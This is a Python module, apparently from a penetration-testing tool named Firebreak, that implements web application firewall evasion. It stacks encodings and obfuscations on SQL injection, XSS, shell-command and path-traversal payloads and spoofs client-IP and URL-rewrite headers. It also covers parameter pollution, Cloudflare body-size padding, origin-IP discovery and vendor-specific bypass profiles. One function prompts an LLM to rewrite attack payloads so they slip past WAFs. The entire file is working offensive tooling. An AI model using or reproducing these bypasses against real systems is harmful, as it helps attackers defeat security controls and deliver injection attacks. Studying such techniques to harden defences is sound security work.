"""
WAF evasion utilities for Firebreak (authorized testing).

Implements encoding/obfuscation, header injection, parameter tricks,
timing, trusted UA, static-extension suffixes, and WAF-specific profiles
drawn from common bypass research (encoding stacks, HPP, Cloudflare size
limits, Imperva path parsing, ModSecurity CRS encoding, etc.).

Protocol-level HTTP request smuggling / raw RST crafting are intentionally
not performed here — those need dedicated traffic tooling. Where possible we
surface equivalent header/method overrides tools can send.
"""

from __future__ import annotations

import base64
import random
import socket
import time
import urllib.parse
from typing import Any, Callable, Dict, List, Optional, Sequence

# ----------------------------------------------------------------------
# User-Agent pools

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.81",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

# Category 5 — trusted / crawler UAs some WAFs treat lightly
TRUSTED_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.7",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.7",
    "zh-CN,zh;q=0.9,en;q=0.8",
]

STATIC_EXTENSIONS = (".jpg", ".png", ".gif", ".css", ".js", ".woff", ".ico", ".svg")

# sqlmap tampers aligned to Category 1 encodings / comments / case
SQLMAP_TAMPERS_AGGRESSIVE = (
    "space2comment,randomcase,between,charencode,charunicodeencode,"
    "percentage,equaltolike,greatest,ifnull2ifisnull,multiplespaces,"
    "space2dash,space2hash,space2plus,space2randomblank,unionalltounion"
)

SQLMAP_TAMPERS_MODSEC = (
    "space2comment,randomcase,percentage,charencode,chardoubleencode,"
    "appendnullbyte,between,symboliclogical"
)


# ======================================================================
# CATEGORY 1 — Encoding & obfuscation
# ======================================================================


def url_encode(payload: str, times: int = 1) -> str:
    """Single/double/triple URL encoding (%XX)."""
    out = payload
    for _ in range(max(1, min(times, 3))):
        out = urllib.parse.quote(out, safe="")
    return out


def unicode_escape(payload: str) -> str:
    """\\uXXXX style escapes for letters (WAF may not normalize)."""
    return "".join(f"\\u{ord(c):04x}" if c.isalpha() else c for c in payload)


def html_entity_encode(payload: str) -> str:
    """HTML entity encoding for XSS contexts."""
    return (
        payload.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )


def base64_encode(payload: str) -> str:
    return base64.b64encode(payload.encode("utf-8", errors="ignore")).decode("ascii")


def hex_encode_sql(payload: str) -> str:
    """0x.... form useful in some SQL contexts."""
    return "0x" + payload.encode("utf-8", errors="ignore").hex()


def hex_escape_bytes(payload: str) -> str:
    return "".join(f"\\x{ord(c):02x}" for c in payload)


def utf8_overlong_dot() -> str:
    """Classic overlong UTF-8 for '.' → %c0%ae (path tricks)."""
    return "%c0%ae"


def utf8_overlong_encode_path(payload: str) -> str:
    """Replace '.' / '/' with overlong forms used against weak normalizers."""
    return (
        payload.replace("..", f"{utf8_overlong_dot()}{utf8_overlong_dot()}")
        .replace("/", "%c0%af")
        .replace("\\", "%c0%af")
    )


def mixed_case(payload: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))


def null_byte_suffix(payload: str) -> str:
    return payload + "%00"


def whitespace_variant(payload: str) -> str:
    replacements = ("%09", "%0a", "%0d", "%0b", "%0c", "/**/")
    out = []
    for c in payload:
        if c == " ":
            out.append(random.choice(replacements))
        else:
            out.append(c)
    return "".join(out)


def comment_insert_sql(payload: str) -> str:
    comments = ("/**/", "/*!*/", "/**_/**/", "--+", "#")
    tokens = payload.split(" ")
    if len(tokens) < 2:
        return payload.replace(" ", random.choice(comments[:3]))
    sep = random.choice(comments[:3])
    return sep.join(tokens)


# Technique name → encoder (Category 1)
ENCODING_TECHNIQUES: Dict[str, Callable[[str], str]] = {
    "url": lambda p: url_encode(p, 1),
    "url_double": lambda p: url_encode(p, 2),
    "url_triple": lambda p: url_encode(p, 3),
    "unicode": unicode_escape,
    "html": html_entity_encode,
    "base64": base64_encode,
    "hex": hex_encode_sql,
    "hex_escape": hex_escape_bytes,
    "overlong": utf8_overlong_encode_path,
    "mixed_case": mixed_case,
    "null_byte": null_byte_suffix,
    "whitespace": whitespace_variant,
    "comments": comment_insert_sql,
}


def apply_encoding_chain(
    payload: str, techniques: Sequence[str] | None = None
) -> str:
    """Apply one or more Category-1 encodings in order."""
    if not techniques:
        techniques = random.sample(
            ["mixed_case", "comments", "whitespace", "url"],
            k=random.randint(1, 3),
        )
    out = payload
    for name in techniques:
        fn = ENCODING_TECHNIQUES.get(name)
        if fn:
            try:
                out = fn(out)
            except Exception:
                continue
    return out


def obfuscate_sql(payload: str) -> str:
    techniques = [
        comment_insert_sql,
        mixed_case,
        whitespace_variant,
        lambda p: p.replace("OR", "||").replace("AND", "&&"),
        lambda p: apply_encoding_chain(p, ["comments", "mixed_case"]),
        lambda p: apply_encoding_chain(p, ["url"]),
        lambda p: null_byte_suffix(comment_insert_sql(p)),
    ]
    return random.choice(techniques)(payload)


def obfuscate_xss(payload: str) -> str:
    techniques = [
        html_entity_encode,
        lambda p: apply_encoding_chain(p, ["html", "url"]),
        mixed_case,
        lambda p: p.replace("<script>", "<scr<script>ipt>"),
        lambda p: p.replace(" ", "%09").replace("=", "%3D"),
        unicode_escape,
    ]
    return random.choice(techniques)(payload)


def obfuscate_rce(payload: str) -> str:
    techniques = [
        lambda p: p.replace(" ", "${IFS}"),
        lambda p: p.replace(" ", "%09"),
        lambda p: apply_encoding_chain(p, ["url"]),
        lambda p: p.replace("/", "${HOME:0:1}"),
        mixed_case,
        null_byte_suffix,
    ]
    return random.choice(techniques)(payload)


def obfuscate_path(payload: str) -> str:
    """Path traversal variants (Imperva-style %2e%2e%2f, overlong)."""
    techniques = [
        utf8_overlong_encode_path,
        lambda p: p.replace("../", "%2e%2e%2f"),
        lambda p: p.replace("../", "....//"),
        lambda p: apply_encoding_chain(p.replace("../", "../"), ["url_double"]),
        lambda p: p.replace("../", "..%252f"),
    ]
    return random.choice(techniques)(payload)


def obfuscate_payload(payload: str, payload_type: str = "sql") -> str:
    mapping = {
        "sql": obfuscate_sql,
        "xss": obfuscate_xss,
        "rce": obfuscate_rce,
        "path": obfuscate_path,
        "lfi": obfuscate_path,
    }
    fn = mapping.get(payload_type.lower(), obfuscate_sql)
    try:
        return fn(payload)
    except Exception:
        return payload


def generate_payload_variants(
    payload: str, payload_type: str = "sql", count: int = 5
) -> List[str]:
    """Produce multiple evasive variants for scanner loops."""
    seen: set[str] = set()
    out: list[str] = []
    for _ in range(max(1, count * 3)):
        variant = obfuscate_payload(payload, payload_type)
        if variant not in seen:
            seen.add(variant)
            out.append(variant)
        if len(out) >= count:
            break
    if payload not in seen:
        out.insert(0, payload)
    return out[:count]


# ======================================================================
# CATEGORY 2–4 — Headers / protocol-ish / parameter helpers
# ======================================================================


def spoofed_forwarded_for() -> str:
    return random.choice(
        [
            "127.0.0.1",
            "10.0.0.1",
            "192.168.1.1",
            "8.8.8.8",
            "1.1.1.1",
            "169.254.169.254",  # AWS metadata IP — sometimes treated specially
        ]
    )


def injection_headers(
    *,
    path: str = "/",
    host: Optional[str] = None,
    aggressive: bool = True,
    custom_payload: Optional[str] = None,
) -> Dict[str, str]:
    """
    Category 4 header injection / rewrite hints.
    Safe for CLI tools as normal request headers (no hop-by-hop TE).
    """
    headers: Dict[str, str] = {
        "X-Forwarded-For": spoofed_forwarded_for(),
        "X-Real-IP": spoofed_forwarded_for(),
        "X-Originating-IP": spoofed_forwarded_for(),
        "X-Client-IP": spoofed_forwarded_for(),
        "True-Client-IP": spoofed_forwarded_for(),
        "Forwarded": f"for={spoofed_forwarded_for()}",
        "Referer": random.choice(
            [
                "https://www.google.com/",
                "https://www.bing.com/",
                f"https://{(host or 'localhost')}/",
            ]
        ),
        "X-HTTP-Method-Override": random.choice(["GET", "POST", "PUT"]),
        "X-Method-Override": random.choice(["GET", "POST"]),
    }
    if aggressive:
        headers.update(
            {
                "X-Original-URL": path or "/",
                "X-Rewrite-URL": path or "/",
                "X-Override-URL": path or "/",
                "X-Custom-IP-Authorization": "127.0.0.1",
                # Custom / rarely monitored injection surfaces
                "X-Api-Version": "1",
                "X-Requested-With": "XMLHttpRequest",
                "CF-Connecting-IP": "127.0.0.1",
            }
        )
        if custom_payload:
            headers["X-Debug"] = custom_payload[:200]
            headers["X-Forwarded-Path"] = custom_payload[:200]
    if host:
        # Prefer spoofed Host hints without breaking TLS SNI (tools keep real Host).
        headers["X-Forwarded-Host"] = host
        headers["X-Host"] = host
        if aggressive:
            headers["X-Original-Host"] = "localhost"
    return headers


def random_headers(
    extra: Optional[Dict] = None,
    *,
    evasion: Optional[Dict[str, Any]] = None,
    target_host: Optional[str] = None,
    path: str = "/",
) -> Dict:
    """Generate randomized (+ optional injection) headers safe for tool wrappers."""
    evasion = evasion or {}
    ua_pool = list(USER_AGENTS)
    if evasion.get("trusted_user_agent") or evasion.get("level") == "aggressive":
        ua_pool = TRUSTED_USER_AGENTS + ua_pool

    headers = {
        "User-Agent": random.choice(ua_pool),
        "Accept": random.choice(
            [
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "application/json,text/plain,*/*",
                "text/plain,*/*;q=0.9",
                "*/*",
            ]
        ),
        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        "Accept-Encoding": random.choice(["gzip, deflate", "gzip"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        "Upgrade-Insecure-Requests": random.choice(["1", "0"]),
        "Pragma": "no-cache",
    }

    if evasion.get("header_injection", True) and evasion.get(
        "random_headers", True
    ):
        headers.update(
            injection_headers(
                path=path,
                host=target_host,
                aggressive=evasion.get("level") in {"high", "aggressive"}
                or evasion.get("header_injection_aggressive", False),
            )
        )

    # Category 3 — hint JSON content-type for body-oriented tools
    if evasion.get("json_wrapping"):
        headers["Content-Type"] = "application/json"

    if extra:
        headers.update(extra)

    # Never inject hop-by-hop headers into scanner tools
    # (chunked/CL smuggling requires raw sockets — see list_techniques).
    for hop in (
        "Connection",
        "Proxy-Connection",
        "Transfer-Encoding",
        "Keep-Alive",
        "TE",
        "Trailer",
        "Upgrade",
    ):
        headers.pop(hop, None)

    if evasion.get("header_reorder", True) and evasion.get("level") in {
        "high",
        "aggressive",
    }:
        return reorder_headers(headers)
    return headers


def build_evasion_headers(
    evasion: Optional[Dict[str, Any]] = None,
    *,
    target: Optional[str] = None,
    path: str = "/",
    extra: Optional[Dict] = None,
) -> Dict[str, str]:
    host = None
    if target:
        parsed = urllib.parse.urlparse(
            target if "://" in target else f"https://{target}"
        )
        host = parsed.hostname
        if parsed.path and parsed.path != "/":
            path = parsed.path
    return random_headers(
        extra, evasion=evasion or {}, target_host=host, path=path
    )


def pollute_params(
    base: Dict[str, str],
    key: str,
    benign: str,
    payload: str,
    *,
    style: str = "last_wins",
) -> List[tuple[str, str]]:
    """
    Category 3 — HTTP Parameter Pollution as ordered pairs.
    style=last_wins: WAF may see benign first; backend may use last.
    """
    if style == "first_wins":
        return [(key, payload), (key, benign)]
    if style == "split":
        mid = max(1, len(payload) // 2)
        return [(key, payload[:mid]), (f"{key}", payload[mid:]), (key, benign)]
    return [(key, benign), (key, payload)]


def wrap_json_payload(key: str, payload: str) -> str:
    """Category 3 — JSON wrapping."""
    return '{"' + key + '":"' + payload.replace("\\", "\\\\").replace('"', '\\"') + '"}'


def multipart_form(
    fields: Dict[str, str],
    *,
    boundary: Optional[str] = None,
) -> tuple[str, str]:
    """
    Category 3 — multipart/form-data body.
    Returns (content_type_header_value, body).
    """
    boundary = boundary or f"----Firebreak{random.randint(10**8, 10**9 - 1)}"
    parts: list[str] = []
    for name, value in fields.items():
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    return f"multipart/form-data; boundary={boundary}", "".join(parts)


def fragment_across_request(
    key: str, payload: str
) -> Dict[str, Any]:
    """
    Category 3 — parameter fragmentation across URL / body / custom header.
    Caller sends params + data + headers together.
    """
    mid = max(1, len(payload) // 3)
    a, b, c = payload[:mid], payload[mid : mid * 2], payload[mid * 2 :]
    return {
        "params": {key: a},
        "data": {key: b, f"{key}_cont": c},
        "headers": {f"X-Param-{key.title()}": payload},
    }


def dual_url_and_body(key: str, payload: str) -> Dict[str, Any]:
    """Category 3 — same parameter in query string and POST body."""
    return {"params": {key: payload}, "data": {key: payload}}


def with_static_extension(url: str, ext: Optional[str] = None) -> str:
    """Category 5 — append .jpg/.png so some WAFs skip inspection."""
    suffix = ext or random.choice(STATIC_EXTENSIONS)
    if "?" in url:
        path, query = url.split("?", 1)
        if path.endswith(suffix):
            return url
        return f"{path}{suffix}?{query}"
    return url.rstrip("/") + suffix


def reorder_headers(headers: Dict[str, str]) -> Dict[str, str]:
    """Category 2 — shuffle header insertion order (signature confusion)."""
    items = list(headers.items())
    random.shuffle(items)
    return dict(items)


WHITELIST_PATHS = (
    "/admin",
    "/api",
    "/api/swagger",
    "/api/v1",
    "/swagger",
    "/swagger-ui",
    "/graphql",
    "/wp-admin",
    "/.well-known/",
    "/health",
    "/status",
    "/metrics",
)


def whitelist_probe_urls(base: str) -> List[str]:
    """Category 5 — paths some WAFs inspect less strictly."""
    root = base.rstrip("/")
    return [f"{root}{p}" for p in WHITELIST_PATHS]


def character_duplicate(payload: str, char: str = "e") -> str:
    """Category 7 ModSecurity — duplicate characters to break signatures."""
    if not char:
        return payload
    return payload.replace(char, char + char)


ENCODING_TECHNIQUES["char_dup"] = character_duplicate


def direct_origin_url(url: str, origin_ip: str) -> str:
    """
    Category 6 — rewrite URL host to origin IP (Host header kept via headers).
    Caller should also set Host / X-Forwarded-Host to the original hostname.
    """
    parsed = urllib.parse.urlparse(url if "://" in url else f"https://{url}")
    netloc = origin_ip
    if parsed.port:
        netloc = f"{origin_ip}:{parsed.port}"
    return urllib.parse.urlunparse(
        (parsed.scheme or "https", netloc, parsed.path or "/", "", parsed.query, "")
    )


def ai_adversarial_payload(
    payload: str, payload_type: str = "sql"
) -> str:
    """
    Category 8 — ask local LLM for an evasive variant; fall back to encoding chain.
    """
    try:
        from orchestrator.ai import llm
        from orchestrator.ai.prompts import DECISION_SYSTEM_PROMPT

        if llm.llm_configured():
            content = llm.chat_completion(
                [
                    {
                        "role": "system",
                        "content": (
                            DECISION_SYSTEM_PROMPT
                            + " Return ONLY the rewritten attack payload string, "
                            "no JSON, no markdown."
                        ),
                    },
                    {
                        "role": "user",
                        "content": (
                            f"Rewrite this {payload_type} payload to evade WAFs "
                            f"using encoding/comments/case tricks:\n{payload}"
                        ),
                    },
                ],
                temperature=0.95,
                timeout=20.0,
            )
            if content:
                line = content.strip().splitlines()[0].strip("`\"' ")
                if line and len(line) < 4000:
                    return line
    except Exception:
        pass
    return apply_encoding_chain(
        payload, ["mixed_case", "comments", "url", "whitespace"]
    )


# ======================================================================
# CATEGORY 5–7 — Timing, origin hints, WAF-specific overlays
# ======================================================================


def random_delay(min_sec: float = 0.1, max_sec: float = 1.5) -> None:
    """Category 5 — time-based evasion / rate-limit dodge."""
    time.sleep(random.uniform(min_sec, max_sec))


def detect_waf(target: str) -> Optional[str]:
    """Attempt to identify WAF using wafw00f."""
    import subprocess

    try:
        output = subprocess.check_output(
            ["wafw00f", target],
            stderr=subprocess.STDOUT,
            text=True,
            timeout=30,
        )
        for line in output.splitlines():
            if "is behind" in line.lower() or "detected" in line.lower():
                return line.strip()
        return None
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return None


def resolve_origin_candidates(host: str) -> Dict[str, Any]:
    """
    Category 6 — light origin IP discovery via DNS A/AAAA.
    (Historical DNS / SSL transparency need external APIs — returned as hints.)
    """
    host = host.strip().lower().removeprefix("www.")
    ips: list[str] = []
    try:
        for family, _, _, _, sockaddr in socket.getaddrinfo(host, None):
            ip = sockaddr[0]
            if ip not in ips:
                ips.append(ip)
    except socket.gaierror:
        pass
    return {
        "host": host,
        "ips": ips,
        "hints": [
            "Check SecurityTrails / ViewDNS historical A records for origin IP",
            "Review SSL certificate SANs for direct-origin hostnames",
            "Enumerate subdomains that may skip the CDN/WAF",
            "Compare CDN anycast vs unique origin PTR/WHOIS",
        ],
    }


def waf_specific_profile(waf_name: str) -> Dict[str, Any]:
    """Category 7 — overlays for known WAF families."""
    name = (waf_name or "").lower()
    if "cloudflare" in name or "cf-ray" in name:
        return {
            "payload_size_pad": 9000,  # exceed free WAF body inspection budget
            "sqlmap_tampers": SQLMAP_TAMPERS_AGGRESSIVE,
            "prefer_trusted_ua": True,
            "static_extension": True,
            "random_delay_min": 1.0,
            "random_delay_max": 4.0,
            "notes": ["Cloudflare: large bodies, origin IP, trusted bots"],
        }
    if "imperva" in name or "incapsula" in name:
        return {
            "path_style": "percent_2e",
            "sqlmap_tampers": "space2comment,randomcase,charencode,percentage",
            "notes": ["Imperva: %2e%2e%2f and JSON traversal quirks"],
        }
    if "aws" in name or "amazon" in name:
        return {
            "parameter_pollution": True,
            "sqlmap_tampers": SQLMAP_TAMPERS_AGGRESSIVE,
            "notes": ["AWS WAF: HPP; avoid targeting link-local metadata in prod"],
        }
    if "azure" in name or "application gateway" in name:
        return {
            "mixed_case": True,
            "sqlmap_tampers": "randomcase,space2comment,percentage",
            "notes": ["Azure WAF: case variation"],
        }
    if "f5" in name or "big-ip" in name or "asm" in name:
        return {
            "header_injection_aggressive": True,
            "sqlmap_tampers": SQLMAP_TAMPERS_AGGRESSIVE,
            "notes": ["F5 ASM: header injection patterns"],
        }
    if "modsecurity" in name or "owasp" in name or "crs" in name:
        return {
            "sqlmap_tampers": SQLMAP_TAMPERS_MODSEC,
            "encoding_stack": ["url_triple", "comments", "mixed_case"],
            "notes": ["ModSecurity/CRS: deep encoding stacks (%2525…)"],
        }
    return {"sqlmap_tampers": SQLMAP_TAMPERS_AGGRESSIVE}


def sqlmap_tamper_for_evasion(evasion: Optional[Dict[str, Any]] = None) -> str:
    evasion = evasion or {}
    if evasion.get("sqlmap_tampers"):
        return str(evasion["sqlmap_tampers"])
    waf = evasion.get("target_waf") or ""
    return str(
        waf_specific_profile(waf).get("sqlmap_tampers") or SQLMAP_TAMPERS_AGGRESSIVE
    )


def pad_body_for_size_limit(payload: str, min_bytes: int = 9000) -> str:
    """Category 7 Cloudflare — pad past common free inspection limits."""
    if len(payload.encode("utf-8", errors="ignore")) >= min_bytes:
        return payload
    pad = "A" * (min_bytes - len(payload))
    return payload + pad


# ======================================================================
# Profile builder
# ======================================================================


def evasion_profile(
    level: str = "medium", target_waf: Optional[str] = None
) -> Dict:
    """
    Return evasion settings. Levels: off, low, medium, high, aggressive.
    Aggressive enables Categories 1–7 helpers used by wrappers/scanners.
    """
    normalized = (level or "medium").lower()
    if normalized in {"off", "none", "false", "0"}:
        return {
            "level": "off",
            "random_headers": False,
            "obfuscate_payloads": False,
            "header_injection": False,
            "random_delay_min": 0.0,
            "random_delay_max": 0.0,
        }

    profiles = {
        "low": {
            "random_headers": True,
            "random_delay_min": 0.0,
            "random_delay_max": 0.3,
            "obfuscate_payloads": False,
            "rotate_user_agent": True,
            "header_injection": False,
            "trusted_user_agent": False,
            "parameter_pollution": False,
            "static_extension": False,
            "json_wrapping": False,
            "encoding_stack": ["mixed_case"],
            "use_random_proxy": False,
            "max_retries": 2,
        },
        "medium": {
            "random_headers": True,
            "random_delay_min": 0.2,
            "random_delay_max": 1.0,
            "obfuscate_payloads": True,
            "rotate_user_agent": True,
            "header_injection": True,
            "trusted_user_agent": False,
            "parameter_pollution": True,
            "static_extension": False,
            "json_wrapping": False,
            "encoding_stack": ["mixed_case", "comments", "url"],
            "use_random_proxy": False,
            "max_retries": 3,
        },
        "high": {
            "random_headers": True,
            "random_delay_min": 0.5,
            "random_delay_max": 2.5,
            "obfuscate_payloads": True,
            "rotate_user_agent": True,
            "header_injection": True,
            "header_injection_aggressive": True,
            "trusted_user_agent": True,
            "parameter_pollution": True,
            "static_extension": True,
            "json_wrapping": True,
            "encoding_stack": [
                "mixed_case",
                "comments",
                "whitespace",
                "url",
                "url_double",
            ],
            "use_random_proxy": True,
            "max_retries": 5,
        },
        "aggressive": {
            "random_headers": True,
            "random_delay_min": 0.8,
            "random_delay_max": 3.5,
            "obfuscate_payloads": True,
            "rotate_user_agent": True,
            "header_injection": True,
            "header_injection_aggressive": True,
            "trusted_user_agent": True,
            "parameter_pollution": True,
            "static_extension": True,
            "json_wrapping": True,
            "encoding_stack": [
                "mixed_case",
                "comments",
                "whitespace",
                "url",
                "url_double",
                "url_triple",
                "null_byte",
                "overlong",
                "html",
            ],
            "payload_variants": 6,
            "size_pad": True,
            "origin_discovery": True,
            "whitelist_paths": True,
            "multipart": True,
            "dual_param": True,
            "method_swap": True,
            "header_reorder": True,
            "ai_payloads": True,
            "use_random_proxy": False,
            "max_retries": 8,
            "sqlmap_tampers": SQLMAP_TAMPERS_AGGRESSIVE,
        },
    }
    profile = dict(profiles.get(normalized, profiles["medium"]))
    profile["level"] = normalized if normalized in profiles else "medium"
    profile["payload_type"] = "sql"
    # high also gets method/header reorder
    if profile["level"] == "high":
        profile.setdefault("method_swap", True)
        profile.setdefault("header_reorder", True)
        profile.setdefault("whitelist_paths", True)
        profile.setdefault("dual_param", True)
    profile["techniques"] = {
        "encoding": True,
        "protocol_headers": profile.get("header_injection"),
        "parameter_manipulation": profile.get("parameter_pollution"),
        "trusted_ua": profile.get("trusted_user_agent"),
        "static_extension": profile.get("static_extension"),
        "time_based": profile.get("random_delay_max", 0) > 0,
        "origin_hints": profile.get("origin_discovery", False),
        "whitelist_paths": profile.get("whitelist_paths", False),
        "ai_payloads": profile.get("ai_payloads", False),
    }

    if target_waf:
        profile["target_waf"] = target_waf
        overlay = waf_specific_profile(target_waf)
        profile.update({k: v for k, v in overlay.items() if k != "notes"})
        profile["waf_notes"] = overlay.get("notes", [])
        if overlay.get("prefer_trusted_ua"):
            profile["trusted_user_agent"] = True
        if overlay.get("random_delay_min") is not None:
            profile["random_delay_min"] = max(
                profile["random_delay_min"], overlay["random_delay_min"]
            )
        if overlay.get("random_delay_max") is not None:
            profile["random_delay_max"] = max(
                profile["random_delay_max"], overlay["random_delay_max"]
            )

    return profile


def list_techniques() -> Dict[str, List[str]]:
    """Operator-facing inventory of implemented technique families."""
    return {
        "encoding_obfuscation": list(ENCODING_TECHNIQUES.keys()),
        "protocol_transport": [
            "method_swap_get_post",
            "header_reorder",
            "oversized_body_pad",
            "method_override_headers",
        ],
        "headers": [
            "x_forwarded_for",
            "x_original_url",
            "x_rewrite_url",
            "method_override",
            "referer_spoof",
            "trusted_user_agent",
            "custom_debug_headers",
            "x_forwarded_host",
        ],
        "parameters": [
            "pollution",
            "split",
            "fragment_url_body_header",
            "json_wrapping",
            "multipart",
            "dual_url_body",
            "static_extension",
        ],
        "contextual": [
            "whitelist_paths",
            "trusted_user_agent",
            "time_based_delay",
            "session_cookies",
            "proxy_ip_geo_rotation",
        ],
        "infrastructure": [
            "origin_dns_candidates",
            "direct_origin_url",
        ],
        "waf_specific": [
            "cloudflare",
            "imperva",
            "aws",
            "azure",
            "f5",
            "modsecurity",
        ],
        "advanced": [
            "ai_adversarial_payload",
            "character_duplicate",
            "encoding_stacks",
        ],
        "not_implemented_protocol": [
            "raw_chunked_smuggling",
            "chunked_plus_content_length",
            "http09_downgrade",
            "http2_smuggling",
            "malformed_raw_headers",
            "rst_packet_crafting",
            "side_channel_timing_oracle",
            "east_west_lateral_only",
        ],
    }
